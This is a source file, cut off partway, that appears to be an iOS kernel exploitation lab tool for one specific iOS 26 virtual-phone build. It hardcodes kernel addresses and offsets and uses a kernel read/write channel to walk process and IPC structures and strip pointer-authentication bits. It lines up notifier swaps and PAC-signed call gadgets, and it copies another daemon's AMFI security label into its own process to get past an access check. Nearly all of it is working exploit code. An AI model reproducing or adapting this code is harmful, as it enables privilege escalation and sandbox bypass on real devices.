#import <Foundation/Foundation.h>

#import <IOKit/IOCFSerialize.h>
#import <IOKit/IOKitLib.h>

#include "CNDLabKernelProtocol.h"

#include <dispatch/dispatch.h>
#include <errno.h>
#include <inttypes.h>
#include <mach-o/loader.h>
#include <net/if.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

/* Exact iOS 26.0 23A341 vPhone layout. */
static const uint64_t CNDStaticKernelBase =
    UINT64_C(0xfffffe0007004000);
static const uint64_t CNDStaticAllProc =
    UINT64_C(0xfffffe0009813020);
static const uint64_t CNDStaticNotificationDictionaryGlobal =
    UINT64_C(0xfffffe0009847538);
static const uint64_t CNDStaticUserNotificationAction =
    UINT64_C(0xfffffe0008253c98);
static const uint64_t CNDStaticBlockNotificationAction =
    UINT64_C(0xfffffe00081c773c);
static const uint64_t CNDStaticSandboxNotificationAction =
    UINT64_C(0xfffffe0009398e6c);
static const uint64_t CNDStaticSandboxPublishCallback =
    UINT64_C(0xfffffe00093ae0d8);
static const uint64_t CNDStaticNoOpBlock =
    UINT64_C(0xfffffe0007a59288);
static const uint64_t CNDStaticNoOpBlockInvoke =
    UINT64_C(0xfffffe00093bac64);
static const uint64_t CNDStatic2ABERegistry =
    UINT64_C(0xfffffe0007789170);
static const uint64_t CNDStatic2ABEBlock =
    UINT64_C(0xfffffe0007788d28);
static const uint64_t CNDStatic2ABEBlockInvoke =
    UINT64_C(0xfffffe00082d6b28);
static const uint64_t CNDStatic2ABEAdapter =
    UINT64_C(0xfffffe000818a05c);
static const uint64_t CNDStatic2ABEReturn =
    UINT64_C(0xfffffe0007c5535c);
static const uint64_t CNDStatic73D8Return =
    UINT64_C(0xfffffe0007c55354);
static const uint64_t CNDStatic2ABEAdapterFixup =
    UINT64_C(0xfffffe0007736c70);
static const uint64_t CNDStatic2ABEReturnFixup =
    UINT64_C(0xfffffe000979c148);
static const uint64_t CNDStatic73D8ReturnFixup =
    UINT64_C(0xfffffe000979c138);
static const uint64_t CNDStaticSHA256DispatchGlobal =
    UINT64_C(0xfffffe0007745750);
static const uint64_t CNDStaticExtendedResearchOID =
    UINT64_C(0xfffffe000772fc78);
static const uint64_t CNDStaticExtendedResearchHandler =
    UINT64_C(0xfffffe0007fde044);
static const uint64_t CNDStaticCPUThreadTypeOID =
    UINT64_C(0xfffffe0007733da8);
static const uint64_t CNDStaticCPUThreadTypeHandler =
    UINT64_C(0xfffffe0007fdf120);
static const uint64_t CNDStaticTriggerKernelCoreDumpOID =
    UINT64_C(0xfffffe0007738bf0);
static const uint64_t CNDStaticTriggerKernelCoreDumpHandler =
    UINT64_C(0xfffffe0008073424);
static const uint64_t CNDStaticMABSOffsetOID =
    UINT64_C(0xfffffe0007738c40);
static const uint64_t CNDStaticMABSOffsetHandler =
    UINT64_C(0xfffffe0008073378);
static const uint64_t CNDStaticHostBootSessionUUIDOID =
    UINT64_C(0xfffffe0007738c90);
static const uint64_t CNDStaticHostBootSessionUUIDHandler =
    UINT64_C(0xfffffe00080732c0);
static const uint64_t CNDStaticResearchModeWord =
    UINT64_C(0xfffffe0007788484);
static const uint64_t CNDStaticResearchModeByte =
    UINT64_C(0xfffffe0007788480);
static const uint64_t CNDStaticResearchModeState =
    UINT64_C(0xfffffe0007788488);
static const uint64_t CNDStaticResearchModeAllowed =
    UINT64_C(0xfffffe00077361b9);
static const uint64_t CNDStaticCPUThreadTypeValue =
    UINT64_C(0xfffffe0009844b5c);
/*
 * IONetworkingFamily's IOEthernetInterface::initIfnetParams loads the raw
 * ether_check_multi import from this otherwise single-use GOT slot, signs it
 * with IA/0xe4fe, and stores it in ifnet_init_params.check_multi.
 */
static const uint64_t CNDStaticIOEthernetCheckMultiGOT =
    UINT64_C(0xfffffe000799f588);
static const uint64_t CNDStaticEtherCheckMulti =
    UINT64_C(0xfffffe0007d293fc);
static const uint64_t CNDStaticIOEthernetInitIfnetParams =
    UINT64_C(0xfffffe0008f87a38);
static const uint64_t CNDStaticIOEthernetCheckMultiSigner =
    UINT64_C(0xfffffe0008f87bf0);
/* Callable entry: bti c; mov w0, #ENOEXEC; ret. */
static const uint64_t CNDStaticENOEXECReturn =
    UINT64_C(0xfffffe00082f6a38);
/* bti c; ldr w0, [x0]; ret */
static const uint64_t CNDStaticLoadW0FromX0 =
    UINT64_C(0xfffffe00082f6590);
/*
 * bti c; x16=[x0+0xb0]; x0=[x0+0x90]; braa x16, IA/0xe4fe.
 */
static const uint64_t CNDStaticIfnetX0Dispatcher =
    UINT64_C(0xfffffe0008f94a8c);
static const uint64_t CNDZoneMin = UINT64_C(0xfffffe1000000000);
static const uint64_t CNDZoneMax = UINT64_C(0xfffffe3fffffffff);
static const uint64_t CNDProcROOffset = UINT64_C(0x18);
static const uint64_t CNDProcPIDOffset = UINT64_C(0x60);
static const uint64_t CNDProcNameOffset = UINT64_C(0x57d);
static const uint64_t CNDProcROTaskOffset = UINT64_C(0x8);
static const uint64_t CNDProcROUcredOffset = UINT64_C(0x28);
static const uint64_t CNDUcredLabelOffset = UINT64_C(0x78);
static const uint64_t CNDTaskIPCSpaceOffset = UINT64_C(0x310);
static const uint64_t CNDIPCSpaceTableOffset = UINT64_C(0x48);
static const uint64_t CNDIPCEntrySize = UINT64_C(0x18);
static const uint64_t CNDPortKobjectOffset = UINT64_C(0x50);
enum {
    CNDAMFISlotOffset = 0x8,
    CNDMACLabelSize = 0x20,
    CNDDictionaryCountOffset = 0x14,
    CNDDictionaryEntriesOffset = 0x20,
    CNDDictionaryEntrySize = 0x10,
    CNDOrderedSetArrayOffset = 0x18,
    CNDOrderedSetCountOffset = 0x30,
    CNDNotifierCollectionOffset = 0x10,
    CNDNotifierTypeOffset = 0x20,
    CNDNotifierActionOffset = 0x28,
    CNDNotifierTargetOffset = 0x38,
    CNDNotifierRefOffset = 0x40,
    CNDNotifierStateOffset = 0x60,
    CNDNotifierSize = 0x68,
    CNDIOMachPortObjectOffset = 0x20,
    CNDIONetworkInterfaceBackingIfnetOffset = 0x90,
    CNDIfnetCheckMultiOffset = 0x238,
    CNDMaxDictionaryEntries = 256,
    CNDMaxNotifiers = 4096,
    CNDMax2ABERegistryEntries = 257,
};

typedef struct {
    int holdSeconds;
    bool notificationTargetSwap;
    bool notificationBlockCanary;
    bool notificationSandboxCanary;
    bool notification2ABE73D8Canary;
    bool ifnetCheckMultiPACCanary;
    bool ifnetKCall1PACCanary;
    bool sysctlPACCensus;
} CNDOptions;

typedef struct {
    uint64_t gotAddress;
    uint64_t originalRaw;
    uint64_t originalTarget;
    uint64_t canaryTarget;
    bool ready;
    bool installed;
    bool restored;
} CNDIfnetPACCanary;

typedef struct {
    char bsdName[IFNAMSIZ];
    uint64_t registryID;
    uint64_t interfaceObject;
    uint64_t backingIfnet;
    uint64_t signedCallback;
    uint64_t callbackTarget;
    uint64_t controllerCookie;
    kern_return_t callKR;
    int readbackResult;
} CNDIfnetSignedInterface;

typedef struct {
    const char *label;
    uint64_t oid;
    uint64_t expectedHandler;
} CNDSysctlPACCandidate;

typedef struct {
    uint64_t notifier;
    uint64_t collection;
    uint64_t type;
    uint64_t rawAction;
    uint64_t action;
    uint64_t rawTarget;
    uint64_t target;
    uint64_t ref;
    uint32_t state;
} CNDNotifierRecord;

typedef struct {
    _Atomic uint32_t callbacks;
    _Atomic uint32_t services;
    _Atomic uint32_t lastIterator;
    _Atomic uint32_t onQueueA;
    _Atomic uint32_t onQueueB;
    dispatch_semaphore_t semaphore;
} CNDNotificationObserver;

typedef struct {
    IONotificationPortRef portA;
    IONotificationPortRef portB;
    dispatch_queue_t queueA;
    dispatch_queue_t queueB;
    io_iterator_t iteratorA;
    io_iterator_t iteratorB;
    CNDNotificationObserver observerA;
    CNDNotificationObserver observerB;
    uint64_t wrapperA;
    uint64_t wrapperB;
    uint64_t targetA;
    uint64_t targetB;
    uint64_t vtableA;
    uint64_t vtableB;
    CNDNotifierRecord notifierA;
    CNDNotifierRecord notifierB;
    CNDNotifierRecord blockActionDonor;
    uint32_t blockActionDonorCount;
    CNDNotifierRecord sandboxActionDonor;
    uint32_t sandboxActionDonorCount;
    uint64_t blockAddress;
    uint64_t blockInvokeRaw;
    uint64_t blockInvoke;
    bool ready;
    bool targetInstalled;
    bool targetRestored;
    bool blockInstalled;
    bool blockRestored;
    bool sandboxInstalled;
    bool sandboxRestored;
    uint64_t pacCallbackFields[CNDMax2ABERegistryEntries];
    uint64_t pacCallbackOriginals[CNDMax2ABERegistryEntries];
    uint32_t pacCallbackCount;
    uint64_t pacAdapterRaw;
    uint64_t pac2ABEReturnRaw;
    uint64_t pac73D8ReturnRaw;
    uint64_t pacDispatchObject;
    uint64_t pacDispatchTargetOriginal;
    bool pacChainPrepared;
    bool pacChainInstalled;
    bool pacChainRestored;
} CNDNotificationSwap;

static int CNDQueueAKey;
static int CNDQueueBKey;

/*
 * A matched, KRW-only trigger experiment.  It first proves that this helper's
 * normal IOServiceOpen is denied.  It then copies only the raw AMFI policy
 * object from a live, entitled bluetoothd label into the helper's own label,
 * performs IOServiceOpen, and restores the complete original label before
 * selector 0 is invoked.  The provider's KernelCall operation is never sent.
 */

static NSString *CNDHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx", value];
}

static int CNDTransferAll(int fd, void *buffer, size_t size, bool writing)
{
    uint8_t *cursor = buffer;
    while (size != 0) {
        ssize_t amount = writing
            ? write(fd, cursor, size) : read(fd, cursor, size);
        if (amount == 0) return ECONNRESET;
        if (amount < 0) {
            if (errno == EINTR) continue;
            return errno != 0 ? errno : EIO;
        }
        cursor += (size_t)amount;
        size -= (size_t)amount;
    }
    return 0;
}

static int CNDRequest(int fd, uint32_t operation, uint64_t address,
    void *buffer, size_t length, uint64_t *value)
{
    if (length > CND_LAB_KRW_MAX_TRANSFER) return E2BIG;
    bool sendsPayload = operation == CNDLabKRWOperationWrite;
    bool receivesPayload = operation == CNDLabKRWOperationRead;
    CNDLabKRWRequest request = {
        .magic = CND_LAB_KRW_MAGIC,
        .version = CND_LAB_KRW_VERSION,
        .operation = operation,
        .length = (uint32_t)length,
        .address = address,
    };
    int result = CNDTransferAll(fd, &request, sizeof(request), true);
    if (result == 0 && sendsPayload && length != 0) {
        result = CNDTransferAll(fd, buffer, length, true);
    }
    CNDLabKRWResponse response = {0};
    if (result == 0) {
        result = CNDTransferAll(fd, &response, sizeof(response), false);
    }
    if (result == 0 && (response.magic != CND_LAB_KRW_MAGIC ||
        response.status != 0 ||
        (receivesPayload && response.length != length))) {
        result = response.status != 0 ? response.status : EPROTO;
    }
    if (result == 0 && receivesPayload && length != 0) {
        result = CNDTransferAll(fd, buffer, length, false);
    }
    if (result == 0 && value != NULL) *value = response.value;
    return result;
}

static int CNDKernelRead(int fd, uint64_t address, void *buffer,
    size_t length)
{
    uint8_t *cursor = buffer;
    while (length != 0) {
        size_t amount = length > CND_LAB_KRW_MAX_TRANSFER
            ? CND_LAB_KRW_MAX_TRANSFER : length;
        int result = CNDRequest(fd, CNDLabKRWOperationRead, address,
            cursor, amount, NULL);
        if (result != 0) return result;
        cursor += amount;
        address += amount;
        length -= amount;
    }
    return 0;
}

static int CNDKernelWrite(int fd, uint64_t address, const void *buffer,
    size_t length)
{
    if (length > CND_LAB_KRW_MAX_TRANSFER) return E2BIG;
    return CNDRequest(fd, CNDLabKRWOperationWrite, address,
        (void *)buffer, length, NULL);
}

__attribute__((naked))
static uint64_t CNDStripDataPointer(uint64_t value)
{
    __asm__ volatile(".long 0xdac147e0"); /* xpacd x0 */
    __asm__ volatile("ret");
}

__attribute__((naked))
static uint64_t CNDStripInstructionPointer(uint64_t value)
{
    __asm__ volatile(".long 0xdac143e0"); /* xpaci x0 */
    __asm__ volatile("ret");
}

static bool CNDKernelObject(uint64_t value)
{
    return value >= CNDZoneMin && value <= CNDZoneMax &&
        (value & UINT64_C(0x7)) == 0;
}

static bool CNDKernelVirtualAddress(uint64_t value)
{
    return value >= UINT64_C(0xfffffe0000000000) &&
        value < UINT64_C(0xffffff0000000000);
}

static NSString *CNDReadKernelCString(int fd, uint64_t rawPointer)
{
    uint64_t pointer = CNDStripDataPointer(rawPointer);
    if (!CNDKernelVirtualAddress(pointer)) return nil;
    char bytes[192] = {0};
    if (CNDKernelRead(fd, pointer, bytes, sizeof(bytes) - 1) != 0) {
        return nil;
    }
    bytes[sizeof(bytes) - 1] = '\0';
    if (memchr(bytes, '\0', sizeof(bytes)) == NULL) return nil;
    return [[NSString alloc] initWithBytes:bytes
        length:strlen(bytes) encoding:NSUTF8StringEncoding];
}

static NSDictionary<NSString *, id> *CNDSysctlPACRecord(int fd,
    uint64_t slide, const CNDSysctlPACCandidate *candidate)
{
    uint64_t oid = candidate->oid + slide;
    uint8_t bytes[0x50] = {0};
    int result = CNDKernelRead(fd, oid, bytes, sizeof(bytes));
    uint64_t rawParent = 0;
    uint64_t rawNext = 0;
    uint64_t rawArgument = 0;
    uint64_t rawName = 0;
    uint64_t rawHandler = 0;
    uint64_t rawFormat = 0;
    uint64_t rawDescription = 0;
    uint32_t number = 0;
    uint32_t kind = 0;
    if (result == 0) {
        memcpy(&rawParent, bytes, sizeof(rawParent));
        memcpy(&rawNext, bytes + 0x8, sizeof(rawNext));
        memcpy(&number, bytes + 0x10, sizeof(number));
        memcpy(&kind, bytes + 0x14, sizeof(kind));
        memcpy(&rawArgument, bytes + 0x18, sizeof(rawArgument));
        memcpy(&rawName, bytes + 0x28, sizeof(rawName));
        memcpy(&rawHandler, bytes + 0x30, sizeof(rawHandler));
        memcpy(&rawFormat, bytes + 0x38, sizeof(rawFormat));
        memcpy(&rawDescription, bytes + 0x40, sizeof(rawDescription));
    }
    uint64_t parent = CNDStripDataPointer(rawParent);
    uint64_t next = CNDStripDataPointer(rawNext);
    uint64_t handler = CNDStripInstructionPointer(rawHandler);
    uint64_t expectedHandler = candidate->expectedHandler + slide;

    bool linked = false;
    bool malformed = false;
    bool cycle = false;
    uint32_t walked = 0;
    uint64_t rawHead = 0;
    uint64_t head = 0;
    uint64_t predecessor = 0;
    uint64_t current = 0;
    uint64_t visited[4096] = {0};
    if (result == 0 && CNDKernelVirtualAddress(parent) &&
        (parent & 7) == 0 &&
        CNDKernelRead(fd, parent, &rawHead, sizeof(rawHead)) == 0) {
        head = CNDStripDataPointer(rawHead);
        current = head;
        while (current != 0 && walked < 4096) {
            if (!CNDKernelVirtualAddress(current) || (current & 7) != 0) {
                malformed = true;
                break;
            }
            for (uint32_t index = 0; index < walked; index++) {
                if (visited[index] == current) {
                    cycle = true;
                    break;
                }
            }
            if (cycle) break;
            visited[walked++] = current;
            if (current == oid) {
                linked = true;
                break;
            }
            uint64_t rawCurrentNext = 0;
            if (CNDKernelRead(fd, current + 0x8, &rawCurrentNext,
                    sizeof(rawCurrentNext)) != 0) {
                malformed = true;
                break;
            }
            predecessor = current;
            current = CNDStripDataPointer(rawCurrentNext);
        }
        if (current != 0 && !linked && !malformed && !cycle &&
            walked == 4096) malformed = true;
    } else if (result == 0) {
        malformed = true;
    }

    NSString *name = result == 0
        ? CNDReadKernelCString(fd, rawName) : nil;
    NSString *format = result == 0
        ? CNDReadKernelCString(fd, rawFormat) : nil;
    NSString *description = result == 0
        ? CNDReadKernelCString(fd, rawDescription) : nil;
    return @{
        @"label": @(candidate->label),
        @"oid": CNDHex(oid),
        @"readResult": @(result),
        @"name": name ?: [NSNull null],
        @"number": @(number),
        @"kind": CNDHex(kind),
        @"delayedRegistrationBit": @((kind & (1U << 25)) != 0),
        @"argumentRaw": CNDHex(rawArgument),
        @"parentRaw": CNDHex(rawParent),
        @"parent": CNDHex(parent),
        @"headRaw": CNDHex(rawHead),
        @"head": CNDHex(head),
        @"nextRaw": CNDHex(rawNext),
        @"next": CNDHex(next),
        @"linked": @(linked),
        @"listWalkCount": @(walked),
        @"listMalformed": @(malformed),
        @"listCycle": @(cycle),
        @"predecessor": CNDHex(predecessor),
        @"handlerRaw": CNDHex(rawHandler),
        @"handler": CNDHex(handler),
        @"expectedHandler": CNDHex(expectedHandler),
        @"handlerTargetMatches": @(handler == expectedHandler),
        @"handlerHasPACBits": @(rawHandler != handler),
        @"static0E2EDonorCandidate": @(!linked && !malformed &&
            handler == expectedHandler && rawHandler != handler),
        @"format": format ?: [NSNull null],
        @"description": description ?: [NSNull null],
    };
}

static int CNDRunSysctlPACCensus(int fd, uint64_t slide,
    NSMutableDictionary<NSString *, id> *report)
{
    const CNDSysctlPACCandidate candidates[] = {
        {"extended-research-mode", CNDStaticExtendedResearchOID,
            CNDStaticExtendedResearchHandler},
        {"cpu-thread-type", CNDStaticCPUThreadTypeOID,
            CNDStaticCPUThreadTypeHandler},
        {"trigger-kernel-coredump", CNDStaticTriggerKernelCoreDumpOID,
            CNDStaticTriggerKernelCoreDumpHandler},
        {"mabs-offset", CNDStaticMABSOffsetOID,
            CNDStaticMABSOffsetHandler},
        {"host-bootsession-uuid", CNDStaticHostBootSessionUUIDOID,
            CNDStaticHostBootSessionUUIDHandler},
    };
    NSMutableArray<NSDictionary<NSString *, id> *> *records =
        [NSMutableArray array];
    uint32_t donors = 0;
    bool valid = true;
    for (size_t index = 0;
         index < sizeof(candidates) / sizeof(candidates[0]); index++) {
        NSDictionary<NSString *, id> *record = CNDSysctlPACRecord(
            fd, slide, &candidates[index]);
        [records addObject:record];
        if ([record[@"static0E2EDonorCandidate"] boolValue]) donors++;
        if ([record[@"readResult"] intValue] != 0 ||
            ![record[@"handlerTargetMatches"] boolValue] ||
            [record[@"listMalformed"] boolValue] ||
            [record[@"listCycle"] boolValue]) valid = false;
    }
    uint32_t researchWord = 0;
    uint8_t researchByte = 0;
    uint32_t researchState = 0;
    uint8_t researchAllowed = 0;
    uint32_t cpuThreadType = 0;
    int conditionResult = CNDKernelRead(fd,
        CNDStaticResearchModeWord + slide,
        &researchWord, sizeof(researchWord));
    if (conditionResult == 0) conditionResult = CNDKernelRead(fd,
        CNDStaticResearchModeByte + slide,
        &researchByte, sizeof(researchByte));
    if (conditionResult == 0) conditionResult = CNDKernelRead(fd,
        CNDStaticResearchModeState + slide,
        &researchState, sizeof(researchState));
    if (conditionResult == 0) conditionResult = CNDKernelRead(fd,
        CNDStaticResearchModeAllowed + slide,
        &researchAllowed, sizeof(researchAllowed));
    if (conditionResult == 0) conditionResult = CNDKernelRead(fd,
        CNDStaticCPUThreadTypeValue + slide,
        &cpuThreadType, sizeof(cpuThreadType));
    report[@"sysctlPACRecords"] = records;
    report[@"sysctlPACCandidateCount"] = @(records.count);
    report[@"sysctlPACReusableDonorCount"] = @(donors);
    report[@"sysctlPACConditionReadResult"] = @(conditionResult);
    report[@"sysctlPACConditions"] = @{
        @"researchWord": @(researchWord),
        @"researchByte": @(researchByte),
        @"researchState": @(researchState),
        @"researchAllowed": @(researchAllowed),
        @"cpuThreadType": @(cpuThreadType),
    };
    report[@"sysctlPACReadOnly"] = @YES;
    report[@"result"] = valid && conditionResult == 0
        ? @"sysctl-pac-census-complete"
        : @"sysctl-pac-census-invalid";
    return valid && conditionResult == 0 ? 0 : EILSEQ;
}

static int CNDReadPointer(int fd, uint64_t address, uint64_t *pointer)
{
    uint64_t raw = 0;
    int result = CNDKernelRead(fd, address, &raw, sizeof(raw));
    uint64_t stripped = CNDStripDataPointer(raw);
    if (pointer != NULL) *pointer = stripped;
    if (result != 0) return result;
    return CNDKernelObject(stripped) ? 0 : EILSEQ;
}

static uint64_t CNDReadDataPointer(int fd, uint64_t address)
{
    uint64_t raw = 0;
    return CNDKernelRead(fd, address, &raw, sizeof(raw)) == 0
        ? CNDStripDataPointer(raw) : 0;
}

static uint64_t CNDFindProcess(int fd, uint64_t head, uint32_t wantedPID,
    uint32_t *visitedOut)
{
    uint64_t process = CNDStripDataPointer(head);
    uint32_t visited = 0;
    for (; visited < 4096 && CNDKernelObject(process); visited++) {
        uint8_t header[0x64] = {0};
        if (CNDKernelRead(fd, process, header, sizeof(header)) != 0) break;
        uint32_t pid = 0;
        memcpy(&pid, header + CNDProcPIDOffset, sizeof(pid));
        if (pid == wantedPID) {
            if (visitedOut != NULL) *visitedOut = visited + 1;
            return process;
        }
        uint64_t rawNext = 0;
        memcpy(&rawNext, header, sizeof(rawNext));
        uint64_t next = CNDStripDataPointer(rawNext);
        if (next == process) break;
        process = next;
    }
    if (visitedOut != NULL) *visitedOut = visited;
    return 0;
}

static int CNDProcessLabel(int fd, uint64_t process, uint64_t *label)
{
    uint64_t procRO = 0;
    uint64_t ucred = 0;
    if (!CNDKernelObject(process) ||
        CNDReadPointer(fd, process + CNDProcROOffset, &procRO) != 0 ||
        CNDReadPointer(fd, procRO + CNDProcROUcredOffset, &ucred) != 0 ||
        CNDReadPointer(fd, ucred + CNDUcredLabelOffset, label) != 0) {
        return EILSEQ;
    }
    return 0;
}

static uint64_t CNDProcessTask(int fd, uint64_t process)
{
    uint64_t procRO = 0;
    uint64_t task = 0;
    if (!CNDKernelObject(process) ||
        CNDReadPointer(fd, process + CNDProcROOffset, &procRO) != 0 ||
        CNDReadPointer(fd, procRO + CNDProcROTaskOffset, &task) != 0) {
        return 0;
    }
    return task;
}

static uint64_t CNDTaskIPCTable(int fd, uint64_t task)
{
    uint64_t space = 0;
    uint64_t rawTable = 0;
    if (!CNDKernelObject(task) ||
        CNDReadPointer(fd, task + CNDTaskIPCSpaceOffset, &space) != 0 ||
        CNDKernelRead(fd, space + CNDIPCSpaceTableOffset,
            &rawTable, sizeof(rawTable)) != 0) {
        return 0;
    }
    uint64_t table = CNDStripDataPointer(rawTable) & ~UINT64_C(0x1f);
    return CNDKernelObject(table) ? table : 0;
}

static uint64_t CNDPortObject(int fd, uint64_t table, mach_port_name_t name)
{
    uint64_t index = (uint64_t)name >> 8;
    if (!CNDKernelObject(table) ||
        index > (UINT64_MAX - table) / CNDIPCEntrySize) {
        return 0;
    }
    uint64_t object = 0;
    return CNDReadPointer(fd, table + index * CNDIPCEntrySize,
        &object) == 0 ? object : 0;
}

static uint64_t CNDIOObjectForPort(int fd, uint64_t table,
    mach_port_name_t name, uint64_t *wrapperOut)
{
    uint64_t port = CNDPortObject(fd, table, name);
    uint64_t wrapper = CNDKernelObject(port)
        ? CNDReadDataPointer(fd, port + CNDPortKobjectOffset) : 0;
    uint64_t object = CNDKernelObject(wrapper)
        ? CNDReadDataPointer(fd,
            wrapper + CNDIOMachPortObjectOffset) : 0;
    if (wrapperOut != NULL) *wrapperOut = wrapper;
    return CNDKernelObject(object) ? object : 0;
}

static int CNDLoadNotifiers(int fd, uint64_t slide,
    CNDNotifierRecord *records, uint32_t capacity, uint32_t *countOut)
{
    if (records == NULL || countOut == NULL || capacity == 0) return EINVAL;
    *countOut = 0;
    uint64_t dictionary = 0;
    if (CNDReadPointer(fd,
            CNDStaticNotificationDictionaryGlobal + slide,
            &dictionary) != 0) {
        return EILSEQ;
    }
    uint8_t dictionaryHeader[0x28] = {0};
    int result = CNDKernelRead(fd, dictionary,
        dictionaryHeader, sizeof(dictionaryHeader));
    if (result != 0) return result;
    uint32_t dictionaryCount = 0;
    uint64_t rawEntries = 0;
    memcpy(&dictionaryCount,
        dictionaryHeader + CNDDictionaryCountOffset,
        sizeof(dictionaryCount));
    memcpy(&rawEntries,
        dictionaryHeader + CNDDictionaryEntriesOffset,
        sizeof(rawEntries));
    uint64_t entries = CNDStripDataPointer(rawEntries);
    if (dictionaryCount == 0 ||
        dictionaryCount > CNDMaxDictionaryEntries ||
        !CNDKernelObject(entries)) {
        return EILSEQ;
    }

    for (uint32_t dictionaryIndex = 0;
         dictionaryIndex < dictionaryCount; dictionaryIndex++) {
        uint64_t entry[2] = {0};
        result = CNDKernelRead(fd,
            entries + dictionaryIndex * CNDDictionaryEntrySize,
            entry, sizeof(entry));
        if (result != 0) return result;
        uint64_t type = CNDStripDataPointer(entry[0]);
        uint64_t collection = CNDStripDataPointer(entry[1]);
        if (!CNDKernelObject(type) || !CNDKernelObject(collection)) {
            return EILSEQ;
        }
        uint8_t collectionHeader[0x40] = {0};
        result = CNDKernelRead(fd, collection,
            collectionHeader, sizeof(collectionHeader));
        if (result != 0) return result;
        uint32_t collectionCount = 0;
        uint64_t rawArray = 0;
        memcpy(&collectionCount,
            collectionHeader + CNDOrderedSetCountOffset,
            sizeof(collectionCount));
        memcpy(&rawArray,
            collectionHeader + CNDOrderedSetArrayOffset,
            sizeof(rawArray));
        if (collectionCount > CNDMaxNotifiers ||
            collectionCount > capacity - *countOut) {
            return E2BIG;
        }
        uint64_t array = collectionCount != 0
            ? CNDStripDataPointer(rawArray) : 0;
        if (collectionCount != 0 && !CNDKernelObject(array)) return EILSEQ;

        for (uint32_t collectionIndex = 0;
             collectionIndex < collectionCount; collectionIndex++) {
            uint64_t rawNotifier = 0;
            result = CNDKernelRead(fd,
                array + collectionIndex * sizeof(uint64_t),
                &rawNotifier, sizeof(rawNotifier));
            uint64_t notifier = CNDStripDataPointer(rawNotifier);
            if (result != 0 || !CNDKernelObject(notifier)) return EILSEQ;
            uint8_t body[CNDNotifierSize] = {0};
            result = CNDKernelRead(fd, notifier, body, sizeof(body));
            if (result != 0) return result;
            uint64_t rawOwner = 0;
            uint64_t rawType = 0;
            CNDNotifierRecord record = {
                .notifier = notifier,
                .collection = collection,
                .type = type,
            };
            memcpy(&rawOwner, body + CNDNotifierCollectionOffset,
                sizeof(rawOwner));
            memcpy(&rawType, body + CNDNotifierTypeOffset,
                sizeof(rawType));
            memcpy(&record.rawAction, body + CNDNotifierActionOffset,
                sizeof(record.rawAction));
            memcpy(&record.rawTarget, body + CNDNotifierTargetOffset,
                sizeof(record.rawTarget));
            memcpy(&record.ref, body + CNDNotifierRefOffset,
                sizeof(record.ref));
            memcpy(&record.state, body + CNDNotifierStateOffset,
                sizeof(record.state));
            if (CNDStripDataPointer(rawOwner) != collection ||
                CNDStripDataPointer(rawType) != type ||
                record.rawAction == 0) {
                return EILSEQ;
            }
            record.action = CNDStripInstructionPointer(record.rawAction);
            record.target = CNDStripDataPointer(record.rawTarget);
            records[(*countOut)++] = record;
        }
    }
    return *countOut != 0 ? 0 : ENOENT;
}

static int CNDResolveNotificationTarget(int fd, uint64_t ipcTable,
    io_iterator_t iterator, const CNDNotifierRecord *records,
    uint32_t recordCount, uint64_t *wrapperOut, uint64_t *targetOut,
    uint64_t *vtableOut, CNDNotifierRecord *notifierOut)
{
    uint64_t port = CNDPortObject(fd, ipcTable, iterator);
    uint64_t wrapper = CNDKernelObject(port)
        ? CNDReadDataPointer(fd, port + CNDPortKobjectOffset) : 0;
    if (!CNDKernelObject(wrapper)) return EILSEQ;

    int result = 0;
    uint32_t matches = 0;
    uint64_t matchedTarget = 0;
    CNDNotifierRecord matchedNotifier = {0};
    /*
     * Exact XNU IOMachPort is 0x28 bytes.  Its fields after OSObject occupy
     * the pointer-aligned window through +0x20; +0x28 is already outside the
     * allocation and must never be probed through a zone-backed provider.
     * Check the small in-allocation pointer window rather than block-reading
     * across a zone boundary; the global notifier ownership match below is
     * what identifies the object field.
     */
    for (size_t offset = 0x10; offset <= 0x20;
         offset += sizeof(uint64_t)) {
        uint64_t rawCandidate = 0;
        result = CNDKernelRead(fd, wrapper + offset,
            &rawCandidate, sizeof(rawCandidate));
        if (result != 0) return result;
        uint64_t candidate = CNDStripDataPointer(rawCandidate);
        if (!CNDKernelObject(candidate)) continue;
        for (uint32_t index = 0; index < recordCount; index++) {
            if (records[index].target != candidate) continue;
            matches++;
            matchedTarget = candidate;
            matchedNotifier = records[index];
        }
    }
    if (matches != 1 || !CNDKernelObject(matchedTarget)) return ENOENT;
    uint64_t rawVtable = 0;
    result = CNDKernelRead(fd, matchedTarget,
        &rawVtable, sizeof(rawVtable));
    uint64_t vtable = CNDStripDataPointer(rawVtable);
    if (result != 0 ||
        (vtable & UINT64_C(0xffff000000000000)) !=
            UINT64_C(0xffff000000000000)) {
        return EILSEQ;
    }
    if (wrapperOut != NULL) *wrapperOut = wrapper;
    if (targetOut != NULL) *targetOut = matchedTarget;
    if (vtableOut != NULL) *vtableOut = vtable;
    if (notifierOut != NULL) *notifierOut = matchedNotifier;
    return 0;
}

static bool CNDProcessNameIs(int fd, uint64_t process,
    const char *expected)
{
    char name[32] = {0};
    return CNDKernelRead(fd, process + CNDProcNameOffset,
        name, sizeof(name) - 1) == 0 && strcmp(name, expected) == 0;
}

static int CNDWriteAndVerifyLabel(int fd, uint64_t label,
    const uint8_t desired[CNDMACLabelSize], uint32_t *writeCount)
{
    if (!CNDKernelObject(label)) return EINVAL;
    int result = CNDKernelWrite(fd, label, desired, CNDMACLabelSize);
    if (result != 0) return result;
    if (writeCount != NULL) (*writeCount)++;
    uint8_t observed[CNDMACLabelSize] = {0};
    result = CNDKernelRead(fd, label, observed, sizeof(observed));
    if (result != 0) return result;
    return memcmp(observed, desired, sizeof(observed)) == 0 ? 0 : EILSEQ;
}

static bool CNDRestoreLabel(int fd, uint64_t label,
    const uint8_t original[CNDMACLabelSize], uint32_t *writeCount)
{
    uint8_t observed[CNDMACLabelSize] = {0};
    if (CNDKernelRead(fd, label, observed, sizeof(observed)) == 0 &&
        memcmp(observed, original, sizeof(observed)) == 0) {
        return true;
    }
    for (unsigned int attempt = 0; attempt < 3; attempt++) {
        if (CNDWriteAndVerifyLabel(
                fd, label, original, writeCount) == 0) return true;
    }
    memset(observed, 0, sizeof(observed));
    return CNDKernelRead(fd, label, observed, sizeof(observed)) == 0 &&
        memcmp(observed, original, sizeof(observed)) == 0;
}

static int CNDConnectProvider(const char *path)
{
    if (path == NULL || strlen(path) >=
        sizeof(((struct sockaddr_un *)0)->sun_path)) {
